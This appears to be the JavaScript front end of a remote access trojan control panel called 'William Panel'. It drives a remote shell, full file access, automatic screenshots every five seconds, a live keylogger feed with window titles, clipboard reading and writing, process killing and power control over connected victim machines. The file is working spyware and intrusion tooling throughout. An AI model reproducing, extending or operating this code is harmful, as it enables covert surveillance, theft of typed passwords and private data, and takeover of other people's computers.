// ── William Panel JS ──────────────────────────────────────────
const socket = io();
let authToken = null;
let selectedDevice = null;
let allDevices = {};
let shellHistory = [];
let shellHistIdx = -1;
let autoSSInterval = null;
let currentFilePath = '/';
let editingFilePath = null;
let allProcs = [];
let keylogData = '';

// ── LOGIN ──────────────────────────────────────────────────────
function doLogin() {
  const pass = document.getElementById('loginPass').value;
  fetch('/api/login', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({password: pass})
  }).then(r => r.json()).then(d => {
    if (d.success) {
      authToken = d.token;
      document.getElementById('loginScreen').classList.add('hidden');
      document.getElementById('mainPanel').classList.remove('hidden');
      socket.emit('panel:auth', {token: authToken});
    } else {
      document.getElementById('loginErr').textContent = 'Wrong password bro';
    }
  });
}
document.getElementById('loginPass').addEventListener('keydown', e => {
  if (e.key === 'Enter') doLogin();
});

// ── SOCKET AUTH ────────────────────────────────────────────────
socket.on('panel:auth:ok', () => { console.log('[+] Panel authed'); });
socket.on('panel:auth:fail', () => { alert('Panel auth failed'); });

// ── DEVICES ───────────────────────────────────────────────────
socket.on('devices:update', (devices) => {
  allDevices = {};
  devices.forEach(d => allDevices[d.id] = d);
  renderDeviceList(devices);
  document.getElementById('deviceCount').textContent = devices.length + ' online';
  if (selectedDevice && !allDevices[selectedDevice]) {
    selectedDevice = null;
    showNoDevice();
  }
});

function renderDeviceList(devices) {
  const list = document.getElementById('deviceList');
  if (!devices.length) {
    list.innerHTML = '<div style="padding:16px;color:#5a6270;font-size:12px">No agents connected.<br/>Run the agent on your device.</div>';
    return;
  }
  list.innerHTML = devices.map(d => `
    <div class="device-item ${selectedDevice===d.id?'active':''}" onclick="selectDevice('${d.id}')">
      <div class="di-dot"></div>
      <div class="di-name">${d.hostname}</div>
      <div class="di-ip">${d.ip}</div>
      <div class="di-plat">${d.platform} · ${d.arch||''}</div>
    </div>
  `).join('');
}

function selectDevice(id) {
  selectedDevice = id;
  renderDeviceList(Object.values(allDevices));
  document.getElementById('noDevice').classList.add('hidden');
  document.getElementById('devicePanel').classList.remove('hidden');
  const d = allDevices[id];
  document.getElementById('tbHostname').textContent = `${d.hostname} — ${d.platform}`;
  // populate more tab
  document.getElementById('agentRawInfo').innerHTML =
    `Hostname: ${d.hostname}<br>Platform: ${d.platform}<br>Arch: ${d.arch}<br>
     CPUs: ${d.cpus}<br>RAM: ${d.totalMem}<br>User: ${d.username}<br>
     IP: ${d.ip}<br>Connected: ${d.connectedAt}`;
  switchTab('shell');
}

function showNoDevice() {
  document.getElementById('noDevice').classList.remove('hidden');
  document.getElementById('devicePanel').classList.add('hidden');
}

// ── TABS ──────────────────────────────────────────────────────
function switchTab(name) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(c => {
    c.classList.remove('active');
    c.classList.add('hidden');
  });
  document.getElementById('tab-'+name).classList.remove('hidden');
  document.getElementById('tab-'+name).classList.add('active');
  document.querySelectorAll('.tab').forEach(t => {
    if (t.textContent.toLowerCase().includes(name)||t.onclick?.toString().includes(name)) t.classList.add('active');
  });
  // fix active tab highlight
  document.querySelectorAll('.tab').forEach(t => {
    const fn = t.getAttribute('onclick');
    if (fn && fn.includes(`'${name}'`)) t.classList.add('active');
  });
  if (name==='files') loadFiles();
  if (name==='sysinfo') refreshSysInfo();
  if (name==='processes') loadProcesses();
}

// ── SHELL ─────────────────────────────────────────────────────
let sessionId = Math.random().toString(36).slice(2);

function sendShell() {
  const input = document.getElementById('shellInput');
  const cmd = input.value.trim();
  if (!cmd || !selectedDevice) return;
  shellHistory.unshift(cmd);
  shellHistIdx = -1;
  addShellLine('$ '+cmd,'cmd');
  socket.emit('panel:shell', {targetId: selectedDevice, command: cmd, sessionId});
  input.value = '';
}

function shellKey(e) {
  if (e.key==='Enter') sendShell();
  if (e.key==='ArrowUp') {
    shellHistIdx = Math.min(shellHistIdx+1, shellHistory.length-1);
    document.getElementById('shellInput').value = shellHistory[shellHistIdx]||'';
  }
  if (e.key==='ArrowDown') {
    shellHistIdx = Math.max(shellHistIdx-1,-1);
    document.getElementById('shellInput').value = shellHistIdx<0?'':shellHistory[shellHistIdx];
  }
}

socket.on('panel:shell:output', ({deviceId, output, sessionId: sid}) => {
  if (deviceId !== selectedDevice) return;
  addShellLine(output, output.toLowerCase().includes('error')||output.toLowerCase().includes('not found')?'err':'out');
});

function addShellLine(text, type='out') {
  const out = document.getElementById('shellOutput');
  const d = document.createElement('div');
  d.className = 'shell-line '+type;
  d.textContent = text;
  out.appendChild(d);
  out.scrollTop = out.scrollHeight;
}

function clearShell() { document.getElementById('shellOutput').innerHTML=''; }
function quickCmd(cmd) { document.getElementById('shellInput').value=cmd; sendShell(); }

// ── FILES ──────────────────────────────────────────────────────
function loadFiles() {
  if (!selectedDevice) return;
  const p = document.getElementById('filePath').value || '/';
  currentFilePath = p;
  socket.emit('panel:ls', {targetId: selectedDevice, dirPath: p});
  document.getElementById('fileBreadcrumb').textContent = 'Path: '+p;
}

function navUp() {
  const parts = currentFilePath.replace(/\\/g,'/').split('/').filter(Boolean);
  parts.pop();
  const newPath = (parts.length?'/'+parts.join('/'):'/');
  document.getElementById('filePath').value = newPath;
  loadFiles();
}

socket.on('panel:ls:result', ({deviceId, entries, error, dirPath}) => {
  if (deviceId!==selectedDevice) return;
  const list = document.getElementById('fileList');
  if (error) { list.innerHTML=`<div style="color:var(--warn)">${error}</div>`; return; }
  if (!entries||!entries.length) { list.innerHTML='<div style="color:var(--sub)">Empty directory</div>'; return; }
  list.innerHTML = entries.map(e => {
    const icon = e.isDir ? '📁' : getFileIcon(e.name);
    return `<div class="file-item" ondblclick="${e.isDir?`navInto('${e.path.replace(/'/g,"\\'")}')`:``}">
      <div class="fi-icon">${icon}</div>
      <div class="fi-name">${e.name}</div>
      <div class="fi-size">${e.isDir?'DIR':formatBytes(e.size)}</div>
      <div class="fi-actions">
        ${e.isDir?`<button class="fi-btn" onclick="navInto('${e.path.replace(/'/g,"\\'")}')">Open</button>`
                 :`<button class="fi-btn" onclick="editFile('${e.path.replace(/'/g,"\\'")}')">Edit</button>
                   <button class="fi-btn" onclick="downloadFile('${e.path.replace(/'/g,"\\'")}')">DL</button>`}
        <button class="fi-btn del" onclick="deleteFile('${e.path.replace(/'/g,"\\'")}')">Del</button>
      </div>
    </div>`;
  }).join('');
});

function navInto(path) {
  document.getElementById('filePath').value = path;
  loadFiles();
}

function getFileIcon(name) {
  const ext = name.split('.').pop().toLowerCase();
  const map = {js:'📜',py:'🐍',sh:'📋',txt:'📄',md:'📝',json:'📦',exe:'⚙️',
    jpg:'🖼️',png:'🖼️',gif:'🖼️',mp4:'🎬',mp3:'🎵',zip:'📦',tar:'📦',gz:'📦',
    pdf:'📕',doc:'📘',docx:'📘',html:'🌐',css:'🎨',log:'📋'};
  return map[ext]||'📄';
}

function formatBytes(b) {
  if (!b||b===0) return '0B';
  const k=1024,sizes=['B','KB','MB','GB'];
  const i=Math.floor(Math.log(b)/Math.log(k));
  return parseFloat((b/Math.pow(k,i)).toFixed(1))+sizes[i];
}

function editFile(path) {
  editingFilePath = path;
  document.getElementById('feFilename').textContent = path;
  document.getElementById('feContent').value = 'Loading...';
  document.getElementById('fileEditor').classList.remove('hidden');
  socket.emit('panel:readfile', {targetId: selectedDevice, filePath: path});
}

socket.on('panel:readfile:result', ({deviceId, content, error}) => {
  if (deviceId!==selectedDevice) return;
  if (error) document.getElementById('feContent').value = 'Error: '+error;
  else document.getElementById('feContent').value = content;
});

function saveFile() {
  const content = document.getElementById('feContent').value;
  socket.emit('panel:writefile', {targetId: selectedDevice, filePath: editingFilePath, content});
}
socket.on('panel:writefile:result', ({deviceId, success, error}) => {
  if (success) notify('File saved ✓');
  else notify('Save error: '+error, true);
});

function closeEditor() {
  document.getElementById('fileEditor').classList.add('hidden');
  editingFilePath = null;
}

function deleteFile(path) {
  if (!confirm('Delete: '+path+'?')) return;
  socket.emit('panel:deletefile', {targetId: selectedDevice, filePath: path});
}
socket.on('panel:deletefile:result', ({success, error}) => {
  if (success) { notify('Deleted ✓'); loadFiles(); }
  else notify('Delete error: '+error, true);
});

function downloadFile(path) {
  socket.emit('panel:download', {targetId: selectedDevice, filePath: path});
}
socket.on('panel:download:result', ({deviceId, filePath, data, error}) => {
  if (deviceId!==selectedDevice) return;
  if (error) { notify('Download error: '+error, true); return; }
  const blob = new Blob([Uint8Array.from(atob(data), c=>c.charCodeAt(0))]);
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = filePath.split('/').pop().split('\\').pop();
  a.click();
});

function uploadFile() { document.getElementById('uploadInput').click(); }
function doUpload(e) {
  const file = e.target.files[0]; if (!file) return;
  const reader = new FileReader();
  reader.onload = () => {
    const b64 = btoa(String.fromCharCode(...new Uint8Array(reader.result)));
    const destPath = currentFilePath.replace(/\/$/,'') + '/' + file.name;
    socket.emit('panel:upload', {targetId: selectedDevice, filePath: destPath, data: b64});
  };
  reader.readAsArrayBuffer(file);
}
socket.on('panel:upload:result', ({success, error}) => {
  if (success) { notify('Uploaded ✓'); loadFiles(); }
  else notify('Upload error: '+error, true);
});

function newFile() {
  const name = prompt('File name:'); if (!name) return;
  const path = currentFilePath.replace(/\/$/,'') + '/' + name;
  socket.emit('panel:writefile', {targetId: selectedDevice, filePath: path, content: ''});
  setTimeout(()=>{ editFile(path); loadFiles(); }, 500);
}

// ── SCREENSHOT ─────────────────────────────────────────────────
function takeScreenshot() {
  if (!selectedDevice) return;
  socket.emit('panel:screenshot', {targetId: selectedDevice});
}
socket.on('panel:screenshot:result', ({deviceId, img, timestamp}) => {
  if (deviceId!==selectedDevice) return;
  const c = document.getElementById('ssContainer');
  c.innerHTML = `<img src="data:image/png;base64,${img}" onclick="this.requestFullscreen()"/>`;
  document.getElementById('ssTimestamp').textContent = 'Taken: '+new Date(timestamp).toLocaleString();
});

function saveScreenshot() {
  const img = document.querySelector('#ssContainer img'); if (!img) return;
  const a = document.createElement('a');
  a.href = img.src;
  a.download = 'screenshot_'+Date.now()+'.png';
  a.click();
}

let autoSSOn = false;
function autoScreenshot() {
  autoSSOn = !autoSSOn;
  const btn = document.getElementById('autoSSBtn');
  if (autoSSOn) {
    btn.textContent = '⏹ Stop Auto';
    btn.style.color = 'var(--warn)';
    autoSSInterval = setInterval(takeScreenshot, 5000);
  } else {
    btn.textContent = '⏱ Auto (5s)';
    btn.style.color = '';
    clearInterval(autoSSInterval);
  }
}

// ── PROCESSES ──────────────────────────────────────────────────
function loadProcesses() {
  if (!selectedDevice) return;
  socket.emit('panel:processes', {targetId: selectedDevice});
}
socket.on('panel:processes:result', ({deviceId, processes, error}) => {
  if (deviceId!==selectedDevice) return;
  const list = document.getElementById('procList');
  if (error) { list.innerHTML=`<div style="color:var(--warn)">${error}</div>`; return; }
  allProcs = processes||[];
  renderProcs(allProcs);
});

function renderProcs(procs) {
  const list = document.getElementById('procList');
  list.innerHTML = `
    <div class="proc-header">
      <span>PID</span><span>Name</span><span>CPU%</span><span>Mem(MB)</span><span>Action</span>
    </div>
    ${procs.map(p=>`
      <div class="proc-row">
        <span class="proc-pid">${p.pid}</span>
        <span class="proc-name">${p.name}</span>
        <span class="proc-cpu">${p.cpu||0}%</span>
        <span class="proc-mem">${p.mem||0}</span>
        <button class="kill-btn" onclick="killProc(${p.pid})">Kill</button>
      </div>
    `).join('')}
  `;
}

function filterProc() {
  const q = document.getElementById('procSearch').value.toLowerCase();
  renderProcs(q ? allProcs.filter(p=>p.name.toLowerCase().includes(q)||String(p.pid).includes(q)) : allProcs);
}

function killProc(pid) {
  if (!confirm('Kill PID '+pid+'?')) return;
  socket.emit('panel:killprocess', {targetId: selectedDevice, pid});
}
socket.on('panel:killprocess:result', ({success, pid, error}) => {
  if (success) { notify('Killed PID '+pid+' ✓'); loadProcesses(); }
  else notify('Kill error: '+error, true);
});

// ── SYSINFO ────────────────────────────────────────────────────
function refreshSysInfo() {
  if (!selectedDevice) return;
  socket.emit('panel:sysinfo', {targetId: selectedDevice});
}
socket.on('panel:sysinfo:result', ({deviceId, info}) => {
  if (deviceId!==selectedDevice) return;
  const g = document.getElementById('sysinfoGrid');
  g.innerHTML = Object.entries(info).map(([k,v])=>`
    <div class="si-card">
      <div class="si-label">${k.toUpperCase()}</div>
      <div class="si-value">${typeof v==='object'?JSON.stringify(v):v}</div>
    </div>
  `).join('');
});

// ── KEYLOG ─────────────────────────────────────────────────────
socket.on('panel:keylog', ({deviceId, keys, timestamp, window: win}) => {
  const line = `<span class="kl-time">[${new Date(timestamp).toLocaleTimeString()}]</span> ` +
    `<span class="kl-device">${allDevices[deviceId]?.hostname||deviceId}</span> ` +
    (win?`<span class="kl-device">[${win}]</span> `:'') +
    keys.map(k => k.startsWith('[') ? `<span class="kl-special">${k}</span>` : `<span class="kl-key">${k}</span>`).join('');

  keylogData += keys.map(k=>k.startsWith('[')?k:k).join('');

  // main keylog tab
  const out = document.getElementById('keylogOutput');
  const d = document.createElement('div'); d.innerHTML = line;
  out.appendChild(d); out.scrollTop = out.scrollHeight;

  // side panel
  const side = document.getElementById('keylogSideOutput');
  side.innerHTML += keys.map(k => k.startsWith('[') ? `<span style="color:var(--warn)">${k}</span>` : k).join('');
  side.scrollTop = side.scrollHeight;
});

document.getElementById('keylogToggle').addEventListener('change', (e) => {
  document.getElementById('keylogPanel').classList.toggle('hidden', !e.target.checked);
});

function clearKeylog() {
  document.getElementById('keylogOutput').innerHTML='';
  keylogData='';
}
function copyKeylog() { navigator.clipboard.writeText(keylogData); notify('Copied ✓'); }
function clearSideKeylog() { document.getElementById('keylogSideOutput').innerHTML=''; }

// ── CLIPBOARD ─────────────────────────────────────────────────
function getClipboard() {
  if (!selectedDevice) return;
  socket.emit('panel:clipboard:get', {targetId: selectedDevice});
}
socket.on('panel:clipboard:result', ({deviceId, content, error}) => {
  if (deviceId!==selectedDevice) return;
  document.getElementById('clipboardContent').textContent = error||content||'(empty)';
});
function setClipboard() {
  const text = document.getElementById('clipboardSet').value;
  socket.emit('panel:clipboard:set', {targetId: selectedDevice, text});
  notify('Clipboard set ✓');
}

// ── MORE ───────────────────────────────────────────────────────
function openUrl() {
  const url = document.getElementById('openUrlInput').value;
  if (!url || !selectedDevice) return;
  socket.emit('panel:openurl', {targetId: selectedDevice, url});
  notify('Sent ✓');
}
function sendAlert() {
  const msg = document.getElementById('alertInput').value;
  if (!msg || !selectedDevice) return;
  socket.emit('panel:alert', {targetId: selectedDevice, message: msg});
  notify('Alert sent ✓');
}
function powerAction(action) {
  if (!selectedDevice || !confirm(`${action} device?`)) return;
  socket.emit('panel:shutdown', {targetId: selectedDevice, action});
  notify(`${action} command sent`);
}
function showPowerMenu() { switchTab('more'); }

// ── UTILS ──────────────────────────────────────────────────────
function notify(msg, isErr=false) {
  const n = document.createElement('div');
  n.style.cssText = `position:fixed;bottom:20px;right:20px;padding:10px 20px;
    background:${isErr?'#2a1010':'#0a2a0a'};border:1px solid ${isErr?'var(--warn)':'var(--green)'};
    color:${isErr?'var(--warn)':'var(--green)'};border-radius:8px;z-index:1000;font-size:13px;
    animation:fadeIn .2s;font-family:var(--font)`;
  n.textContent = msg;
  document.body.appendChild(n);
  setTimeout(()=>n.remove(), 2500);
}
function closeModal() { document.getElementById('modal').classList.add('hidden'); }
